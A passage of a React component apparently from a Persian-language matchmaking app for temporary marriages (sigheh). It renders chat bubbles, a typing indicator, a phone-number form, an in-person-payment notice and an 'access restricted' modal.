                  message.isUser ? 'order-1 mr-2' : 'order-2 ml-2'
                }`}>
                  {message.isUser ? (
                    <div className="w-10 h-10 bg-pink-100 rounded-full flex items-center justify-center">
                      <i className="ri-user-3-fill text-pink-600 text-lg"></i>
                    </div>
                  ) : message.type === 'system' ? (
                    <div className="w-10 h-10 bg-blue-100 rounded-full flex items-center justify-center">
                      <i className="ri-settings-4-fill text-blue-600 text-lg"></i>
                    </div>
                  ) : (
                    <img 
                      src={userProfile?.avatar}
                      alt={userProfile?.name}
                      className="w-10 h-10 rounded-full object-cover shadow-lg"
                    />
                  )}
                </div>
              </div>
            );
          })}

          {isTyping && (
            <div className="flex justify-end">
              <div className="max-w-[75%] order-1">
                <div className="bg-white text-gray-800 px-4 py-3 rounded-2xl rounded-bl-md shadow-lg border border-gray-100">
                  <div className="flex space-x-1 rtl:space-x-reverse justify-center">
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce"></div>
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.1s'}}></div>
                    <div className="w-2 h-2 bg-gray-400 rounded-full animate-bounce" style={{animationDelay: '0.2s'}}></div>
                  </div>
                </div>
              </div>
              <div className="w-10 h-10 rounded-full flex items-center justify-center flex-shrink-0 order-2 ml-2">
                <img 
                  src={userProfile?.avatar}
                  alt={userProfile?.name}
                  className="w-10 h-10 rounded-full object-cover shadow-lg"
                />
              </div>
            </div>
          )}
          
          <div ref={messagesEndRef} />
        </div>
      </div>

      {showPhoneInput && (
        <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border-t border-blue-200 p-4">
          <div className="max-w-md mx-auto">
            <label className="block text-blue-800 text-sm font-semibold mb-3">شماره تماس جهت هماهنگی:</label>
            <div className="flex space-x-3 rtl:space-x-reverse">
              <input
                type="tel"
                value={phoneNumber}
                onChange={(e) => setPhoneNumber(e.target.value)}
                placeholder="09xxxxxxxxx"
                className="flex-1 bg-white border border-blue-300 rounded-xl px-4 py-3 focus:outline-none focus:ring-2 focus:ring-blue-500 text-sm"
                maxLength={11}
              />
              <button
                onClick={handlePhoneSubmit}
                className="bg-gradient-to-r from-blue-600 to-indigo-600 hover:from-blue-700 hover:to-indigo-700 text-white px-6 py-3 rounded-xl font-semibold transition-all duration-300"
              >
                ارسال
              </button>
            </div>
          </div>
        </div>
      )}

      {showFinalNotice && (
        <div className="bg-gradient-to-r from-orange-50 to-red-50 border-t border-orange-200 p-6">
          <div className="bg-white rounded-2xl p-6 shadow-lg">
            <div className="text-center mb-4">
              <div className="w-16 h-16 bg-gradient-to-r from-orange-500 to-red-600 rounded-full flex items-center justify-center mx-auto mb-4">
                <i className="ri-information-line text-white text-2xl"></i>
              </div>
              <h3 className="font-bold text-gray-800 text-lg mb-2">⚠️ توجه مهم</h3>
            </div>
            
            <div className="space-y-4 text-sm text-gray-700 leading-relaxed">
              <p className="bg-yellow-50 border border-yellow-200 rounded-xl p-4">
                <strong>هماهنگی ممکنه بین ۲ الی ۲۴ ساعت زمان‌بر باشد.</strong> در نظر داشته باشید ارتباط شما با کیس مورد نظر کاملاً رایگان هست و پرداختی‌ها باید به صورت حضوری پرداخت شود.
              </p>
              
              <p className="bg-red-50 border border-red-200 rounded-xl p-4">
                <strong>⛔ در صورت هماهنگی تا قبل از دیدار تحت هیچ عنوان هزینه‌ای رد و بدل نشود.</strong>
              </p>
              
              <p className="bg-blue-50 border border-blue-200 rounded-xl p-4">
                در نظر داشته باشید این مورد برای رابطه‌های موقت (صیغه) گفته شده. کاربران мы تایید شدند اما طبق قرارداد طرفین، <strong>تمامی پرداخت‌ها باید صورت حضوری انجام شود.</strong>
              </p>
            </div>
            
            <div className="text-center mt-6 pt-4 border-t border-gray-200">
              <p className="text-gray-600 text-sm font-medium">با سپاس 🙏</p>
            </div>
          </div>
        </div>
      )}

      {showAccessDenied && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50 p-4">
          <div className="bg-white rounded-3xl p-6 w-full max-w-sm text-center">
            <div className="w-16 h-16 bg-red-100 rounded-full flex items-center justify-center mx-auto mb-4">
              <i className="ri-lock-line text-red-500 text-2xl"></i>
            </div>
            <h3 className="font-bold text-gray-800 text-lg mb-2">دسترسی محدود شده</h3>
            <p className="text-gray-600 text-sm mb-6 leading-relaxed">
              کیس مورد نظر درخواست ارتباط با شما را هنوز تایید نکرده است
            </p>
            <button 
              onClick={() => setShowAccessDenied(false)}
              className="w-full bg-red-500 hover:bg-red-600 text-white py-3 px-4 rounded-2xl transition-colors"
            >
              متوجه شدم
            </button>
          </div>
        </div>
      )}

      {!showPhoneInput && !showFinalNotice && (
        <div className="bg-white/95 backdrop-blur-lg border-t border-gray-200 p-4 pb-20">
          <div className="flex items-end space-x-3 rtl:space-x-reverse">
            <div className="flex-1 relative">
              <textarea
                value={inputText}
                onChange={(e) => setInputText(e.target.value)}
                onKeyPress={handleKeyPress}
                placeholder="پیام خود را بنویسید..."
                rows={1}
                className="w-full bg-gray-100 border-none rounded-2xl py-3 px-4 text-sm focus:outline-none focus:ring-2 focus:ring-pink-500 resize-none max-h-24"
                style={{ minHeight: '48px' }}
                disabled={chatClosed}
              />
            </div>
            
            <button
              onClick={() => sendMessage()}
              disabled={!inputText.trim() || chatClosed}
              className={`w-12 h-12 rounded-full flex items-center justify-center transition-all ${
                inputText.trim() && !chatClosed
                  ? 'bg-gradient-to-r from-pink-500 to-rose-600 hover:from-pink-600 hover:to-rose-700 text-white shadow-lg scale-100'
                  : 'bg-gray-200 text-gray-400 scale-95'
              }`}
            >
              <i className="ri-send-plane-fill text-xl"></i>
            </button>
          </div>
        </div>
      )}

      <TabBar />
    </div>
  );
}